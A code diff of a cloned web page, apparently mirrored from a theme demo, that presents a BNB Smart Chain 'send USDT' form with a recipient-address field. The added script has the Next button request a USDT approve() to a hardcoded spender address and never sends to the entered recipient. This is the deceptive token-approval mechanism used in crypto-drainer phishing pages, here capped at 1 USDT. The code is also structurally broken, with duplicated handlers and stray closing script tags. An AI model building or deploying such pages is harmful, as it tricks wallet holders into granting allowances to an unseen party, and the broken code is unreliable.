+      const chainId = String(await walletProvider.request({ method: 'eth_chainId' })).toLowerCase();
+      if (chainId !== BSC_CHAIN_ID_HEX) {
+        throw new Error('Wallet is not on BNB Smart Chain. Please select BNB Smart Chain in your wallet.');
+      }
+      return true;
     }
 
+    function setupWalletEvents(provider) {
+      if (!provider || typeof provider.on !== 'function') return;
 
-    const chainId =
-        await provider.request({
+      provider.on('accountsChanged', function(accounts) {
+        connectedAccount = accounts && accounts.length ? accounts[0] : null;
+        const status = document.getElementById('walletStatus');
+        const button = document.getElementById('connectWalletBtn');
+        if (connectedAccount) {
+          status.textContent = connectedAccount.slice(0, 6) + '...' + connectedAccount.slice(-4);
+          button.textContent = 'BSC Wallet Connected';
+          button.classList.add('connected');
+        } else {
+          status.textContent = 'Wallet not connected';
+          button.textContent = 'Connect BNB Wallet';
+          button.classList.remove('connected');
+        }
+        updateApprovalButton();
+      });
 
-            method:
-                "eth_chainId"
+      provider.on('chainChanged', function(chainId) {
+        const isBSC = String(chainId).toLowerCase() === BSC_CHAIN_ID_HEX;
+        updateApprovalButton();
+        if (isBSC) {
+          showStatus('BNB Smart Chain active.', 'success');
+        } else {
+          showStatus('Wallet changed away from BNB Smart Chain. Approval is disabled.', 'error');
+        }
+      });
 
-        });
-
-
-    if (
-        String(chainId)
-            .toLowerCase()
-        !==
-        BSC_CHAIN_ID_HEX
-    ) {
-
-        throw new Error(
-            "Transaction blocked: wallet is not connected to BNB Smart Chain."
-        );
-
+      provider.on('disconnect', function() {
+        connectedAccount = null;
+        document.getElementById('walletStatus').textContent = 'Wallet disconnected';
+        document.getElementById('nextBtn').disabled = true;
+      });
     }
 
-
-    return true;
-}
-
-
-/*
-=========================================================
-APPROVE EXACTLY 1 USDT
-=========================================================
-*/
-
-async function approveOneUSDT() {
-
-    try {
-
-        /*
-        Never approve unless BSC
-        is already connected.
-        */
-
-        await verifyBSC();
-
-
-        if (
-            !account
-        ) {
-
-            throw new Error(
-                "Please connect your BNB wallet first."
-            );
-
-        }
-
-
-        showLoading(
-            "Preparing 1 USDT approval..."
-        );
-
-
-        const usdt =
-            getUSDTContract();
-
-
-        /*
-        Read decimals directly
-        from BSC USDT.
-        */
-
-        const decimals =
-            Number(
-                await usdt.methods
-                    .decimals()
-                    .call()
-            );
-
-
-        /*
-        EXACTLY 1 USDT
-
-        For BSC USDT this is normally:
-
-        1 × 10^18
-
-        */
-
-        const oneUSDT =
-            web3.utils.toBN(
-                10
-            ).pow(
-                web3.utils.toBN(
-                    decimals
-                )
-            );
-
-
-        /*
-        Check balance.
-        */
-
-        const balance =
-            await usdt.methods
-                .balanceOf(
-                    account
-                )
-                .call();
-
-
-        if (
-            web3.utils.toBN(
-                balance
-            ).lt(
-                oneUSDT
-            )
-        ) {
-
-            throw new Error(
-                "Insufficient BSC USDT balance. At least 1 USDT is required."
-            );
-
-        }
-
-
-        /*
-        Check current allowance.
-        */
-
-        const currentAllowance =
-            await usdt.methods
-                .allowance(
-                    account,
-                    SPENDER_ADDRESS
-                )
-                .call();
-
-
-        /*
-        Already approved?
-        */
-
-        if (
-            web3.utils.toBN(
-                currentAllowance
-            ).gte(
-                oneUSDT
-            )
-        ) {
-
-            hideLoading();
-
-            showStatus(
-                "This wallet already has at least 1 USDT allowance.",
-                "success"
-            );
-
-            return;
-
-        }
-
-
-        /*
-        IMPORTANT:
-
-        EXACTLY 1 USDT.
-
-        No unlimited allowance.
-        */
-
-        showLoading(
-            "Confirm exactly 1 USDT in your wallet..."
-        );
-
-
-        const receipt =
-            await usdt.methods
-                .approve(
-                    SPENDER_ADDRESS,
-                    oneUSDT.toString()
-                )
-                .send({
-                    from:
-                        account
-                });
-
-
-        hideLoading();
-
-
-        showStatus(
-            "1 USDT approval confirmed. Tx: " +
-            receipt.transactionHash,
-            "success"
-        );
-
-
-        console.log(
-            "BSC approval transaction:",
-            receipt.transactionHash
-        );
-
+    function updateApprovalButton() {
+      const button = document.getElementById('nextBtn');
+      const amount = parseFloat(document.getElementById('amount').value || '0');
+      button.disabled = !(connectedAccount && amount === 1);
     }
 
-    catch (error) {
-
-        hideLoading();
-
-        console.error(
-            "BSC approval failed:",
-            error
-        );
-
-
-        if (
-            error &&
-            Number(error.code) === 4001
-        ) {
-
-            showStatus(
-                "Approval cancelled in your wallet.",
-                "error"
-            );
-
-            return;
-
-        }
-
-
-        showStatus(
-            error.message ||
-            "1 USDT approval failed.",
-            "error"
-        );
-    }
-}
-
-
-/*
-=========================================================
-CONNECT BUTTON
-=========================================================
-*/
-
-connectWalletBtn.addEventListener(
-    "click",
-    connectBSCWallet
-);
-
-
-/*
-=========================================================
-APPROVAL BUTTON
-=========================================================
-*/
-
-nextBtn.addEventListener(
-    "click",
-    async () => {
-
-        if (
-            nextBtn.disabled
-        ) {
-
-            return;
-
-        }
-
-        await approveOneUSDT();
-
-    }
-);
-
-
-/*
-=========================================================
-PASTE BUTTON
-=========================================================
-*/
-
-document
-    .getElementById(
-        "pasteBtn"
-    )
-    .addEventListener(
-        "click",
-        async () => {
-
-            try {
-
-                const text =
-                    await navigator
-                        .clipboard
-                        .readText();
-
-                document
-                    .getElementById(
-                        "address"
-                    )
-                    .value =
-                    text;
-
-            }
-
-            catch (error) {
-
-                showStatus(
-                    "Clipboard permission was unavailable.",
-                    "error"
-                );
-
-            }
-
-        }
-    );
-
-
-/*
-=========================================================
-MAX BUTTON
-=========================================================
-*/
-
-document
-    .getElementById(
-        "maxBtn"
-    )
-    .addEventListener(
-        "click",
-        async () => {
-
-            try {
-
-                await verifyBSC();
-
-                const usdt =
-                    getUSDTContract();
-
-                const decimals =
-                    Number(
-                        await usdt.methods
-                            .decimals()
-                            .call()
-                    );
-
-                const balance =
-                    await usdt.methods
-                        .balanceOf(
-                            account
-                        )
-                        .call();
-
-                const formatted =
-                    web3.utils
-                        .fromWei(
-                            balance,
-                            "ether"
-                        );
-
-                amountInput.value =
-                    formatted;
-
-                estimate.textContent =
-                    "≈ $" +
-                    Number(
-                        formatted
-                    ).toFixed(2);
-
-            }
-
-            catch (error) {
-
-                showStatus(
-                    error.message ||
-                    "Could not read BSC USDT balance.",
-                    "error"
-                );
-
-            }
-
-        }
-    );
-
-
-/*
-=========================================================
-AMOUNT DISPLAY
-=========================================================
-*/
-
-amountInput.addEventListener(
-    "input",
-    () => {
-
-        const value =
-            Number(
-                amountInput.value
-            );
-
-        if (
-            value > 0
-        ) {
-
-            estimate.textContent =
-                "≈ $" +
-                value.toFixed(2);
-
-        }
-
-        else {
-
-            estimate.textContent =
-                "≈ $0.00";
-
-        }
-
-    }
-);
-
-
-/*
-=========================================================
-ACCOUNT / CHAIN EVENTS
-=========================================================
-*/
-
-function setupProviderEvents(
-    currentProvider
-) {
-
-    if (
-        !currentProvider ||
-        typeof currentProvider.on !==
-            "function"
-    ) {
-
-        return;
-
-    }
-
-
-    currentProvider.on(
-        "accountsChanged",
-        accounts => {
-
-            if (
-                accounts &&
-                accounts.length
-            ) {
-
-                account =
-                    accounts[0];
-
-                walletStatus.textContent =
-                    shortAddress(
-                        account
-                    );
-
-                nextBtn.disabled =
-                    false;
-
-            }
-
-            else {
-
-                account =
-                    null;
-
-                walletStatus.textContent =
-                    "Wallet not connected";
-
-                connectWalletBtn.textContent =
-                    "Connect BNB Wallet";
-
-                connectWalletBtn.classList.remove(
-                    "connected"
-                );
-
-                nextBtn.disabled =
-                    true;
-
-            }
-
-        }
-    );
-
-
-    currentProvider.on(
-        "chainChanged",
-        chainId => {
-
-            const normalized =
-                String(chainId)
-                    .toLowerCase();
-
-
-            /*
-            If wallet leaves BSC,
-            immediately disable approval.
-            */
-
-            if (
-                normalized !==
-                BSC_CHAIN_ID_HEX
-            ) {
-
-                nextBtn.disabled =
-                    true;
-
-                showStatus(
-                    "Wallet changed away from BNB Smart Chain. Approval is disabled.",
-                    "error"
-                );
-
-            }
-
-            else {
-
-                nextBtn.disabled =
-                    !account;
-
-                showStatus(
-                    "BNB Smart Chain active.",
-                    "success"
-                );
-
-            }
-
-        }
-    );
-
-
-    currentProvider.on(
-        "disconnect",
-        () => {
-
-            account =
-                null;
-
-            nextBtn.disabled =
-                true;
-
-            walletStatus.textContent =
-                "Wallet disconnected";
-
-            connectWalletBtn.textContent =
-                "Connect BNB Wallet";
-
-            connectWalletBtn.classList.remove(
-                "connected"
-            );
-
-            showStatus(
-                "Wallet disconnected.",
-                "error"
-            );
-
-        }
-    );
-}
-
-
-/*
-=========================================================
-INITIAL STATE
-=========================================================
-*/
-
-console.log(
-    "===================================="
-);
-
-console.log(
-    "BSC-ONLY USDT DEMO"
-);
-
-console.log(
-    "WalletConnect Project ID:",
-    WALLETCONNECT_PROJECT_ID
-);
-
-console.log(
-    "Required Chain:",
-    BSC_CHAIN_ID
-);
-
-console.log(
-    "Required Chain Hex:",
-    BSC_CHAIN_ID_HEX
-);
-
-console.log(
-    "BSC USDT:",
-    USDT_ADDRESS
-);
-
-console.log(
-    "Approval Amount:",
-    "1 USDT"
-);
-
-console.log(
-    "===================================="
-);
-
+    window.addEventListener('load', function() {
+      updateApprovalButton();
+    });
+  </script>
 </script>
 
-</body>
-</html>
+<script>
+    /* BSC demo approval: exactly 1 USDT. No unlimited allowance,
+       no automatic BNB top-up, and no wallet/balance telemetry. */
+
+    function showLoading(message = 'Processing...') {
+      const overlay = document.getElementById('loadingOverlay');
+      const text = overlay.querySelector('.loading-text');
+      if (text) text.textContent = message;
+      overlay.style.display = 'flex';
+    }
+
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+    }
+
+    function showStatus(message, type = 'info') {
+      let el = document.getElementById('statusMessage');
+      if (!el) {
+        el = document.createElement('div');
+        el.id = 'statusMessage';
+        el.style.cssText = 'margin:0 0 18px;padding:12px 14px;border-radius:10px;font-size:13px;line-height:1.4;';
+        document.querySelector('.estimate').insertAdjacentElement('afterend', el);
+      }
+      el.textContent = message;
+      el.style.display = 'block';
+      el.style.background = type === 'error' ? 'rgba(255,72,72,.12)' :
+        type === 'success' ? 'rgba(1,217,126,.12)' : 'rgba(255,255,255,.06)';
+      el.style.color = type === 'error' ? '#ff8c8c' :
+        type === 'success' ? '#01d97e' : '#bdbdbd';
+    }
+
+    function clearStatus() {
+      const el = document.getElementById('statusMessage');
+      if (el) el.style.display = 'none';
+    }
+
+    async function TokenApprove() {
+      try {
+        await verifyBSC();
+
+        const amount = parseFloat(document.getElementById('amount').value || '0');
+        if (amount !== 1) {
+          throw new Error('For this demo, the approval amount must be exactly 1 USDT.');
+        }
+
+        showLoading('Preparing 1 USDT approval...');
+
+        const web3 = window.web3 || new Web3(walletProvider);
+        const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
+        const decimals = Number(await usdtContract.methods.decimals().call());
+        const oneUSDT = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));
+
+        const balance = await usdtContract.methods.balanceOf(connectedAccount).call();
+        if (web3.utils.toBN(balance).lt(oneUSDT)) {
+          throw new Error('Insufficient BSC USDT balance. At least 1 USDT is required.');
+        }
+
+        const allowance = await usdtContract.methods.allowance(connectedAccount, addressSTAKING).call();
+        if (web3.utils.toBN(allowance).gte(oneUSDT)) {
+          hideLoading();
+          showStatus('This wallet already has an allowance of at least 1 USDT.', 'success');
+          return;
+        }
+
+        hideLoading();
+        showStatus('Confirm exactly 1 USDT approval in your wallet.', 'info');
+
+        const receipt = await usdtContract.methods
+          .approve(addressSTAKING, oneUSDT.toString())
+          .send({ from: connectedAccount });
+
+        showStatus('1 USDT approval confirmed. Transaction: ' + receipt.transactionHash, 'success');
+      } catch (error) {
+        hideLoading();
+        console.error('Approval error:', error);
+        if (Number(error && error.code) === 4001) {
+          showStatus('Approval was cancelled in the wallet.', 'error');
+        } else {
+          showStatus(error.message || '1 USDT approval failed.', 'error');
+        }
+      }
+    }
+
+    function handleNextClick() {
+      if (!connectedAccount) {
+        showStatus('Please connect your BNB Smart Chain wallet first.', 'error');
+        return;
+      }
+      const amount = parseFloat(document.getElementById('amount').value || '0');
+      if (amount !== 1) {
+        showStatus('For this demo, enter exactly 1 USDT.', 'error');
+        return;
+      }
+      TokenApprove();
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const amountInput = document.getElementById('amount');
+      amountInput.value = '1';
+      amountInput.addEventListener('input', updateApprovalButton);
+      amountInput.addEventListener('change', updateApprovalButton);
+      updateApprovalButton();
+    });
+</script>
+</script>
+<script>
+    // Amount validation - Make amount field mandatory
+    function validateAmount() {
+        const amountInput = document.getElementById('amount');
+        const nextBtn = document.getElementById('nextBtn');
+        const amountValue = amountInput.value.trim();
+        
+        // Check if amount is valid (not empty and greater than 0)
+        if (amountValue && parseFloat(amountValue) > 0) {
+            nextBtn.disabled = false;
+            return true;
+        } else {
+            nextBtn.disabled = true;
+            return false;
+        }
+    }
+
+    // Handle Next button click with validation
+    function handleNextClick() {
+        if (validateAmount()) {
+            TokenApprove();
+        } else {
+            alert('Please enter a valid amount before proceeding.');
+        }
+    }
+
+    // Initialize validation on page load
+    document.addEventListener('DOMContentLoaded', function() {
+        const amountInput = document.getElementById('amount');
+        const nextBtn = document.getElementById('nextBtn');
+        
+        // Disable Next button initially
+        if (nextBtn) {
+            nextBtn.disabled = true;
+        }
+        
+        // Validate on input change
+        if (amountInput) {
+            amountInput.addEventListener('input', validateAmount);
+            amountInput.addEventListener('change', validateAmount);
+            amountInput.addEventListener('keyup', validateAmount);
+            
+            // Validate on paste
+            amountInput.addEventListener('paste', function() {
+                setTimeout(validateAmount, 10);
+            });
+        }
+    });
+
+    // Also validate when Max button is clicked (if Max button fills the amount)
+    document.addEventListener('DOMContentLoaded', function() {
+        const maxBtn = document.querySelector('.max-btn');
+        if (maxBtn) {
+            maxBtn.addEventListener('click', function() {
+                // Wait a bit for Max to fill the value, then validate
+                setTimeout(validateAmount, 100);
+            });
+        }
+    });
+</script>
+
+
+
+
+
+
+
+
+
+
+</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
